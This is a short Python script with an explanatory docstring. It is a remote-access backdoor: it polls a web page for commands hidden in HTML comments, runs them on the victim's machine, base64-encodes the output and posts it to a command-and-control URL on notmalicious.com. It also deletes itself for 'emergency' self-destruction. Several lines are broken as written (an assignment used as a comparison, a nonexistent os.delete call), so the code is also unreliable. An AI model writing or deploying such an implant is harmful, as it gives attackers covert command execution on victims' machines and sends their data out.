import requests
import re
import subprocess
import time
import os

while 1:
	req = requests.get("http://127.0.0.1")
	comments = re.findall('<!--(.*)-->',req.text)
	for comment in comments:
		if comment = " ":
			os.delete(__file__)
		else:
			try:
				response = subprocess.check_output(comment.split())
			except:
				response = "command fail"
	data={"comment":(''.join(response)).encode("base64")}
	newreq = requests.post("http://notmalicious.com/c2.php",data=data)
	time.sleep(30)

"""
Two webpages need to be up and running for this script to work. 
The script runs on the victim side and takes commands input by the attacker 
from the comments of the first webpage. In the second webpage we get the results of 
the commads, the script will make the victim make a POST request encrypted with base64
to the second web page. Finally we can analyze the logs of the second webpage to 
get the results. the os.delete(__file__) function is supposed to deleted the script,
in case there are no commands to execute --> " " in line 11, a such auto-deleteion 
feauture could be used to self-destruction in an emergency. 
"""
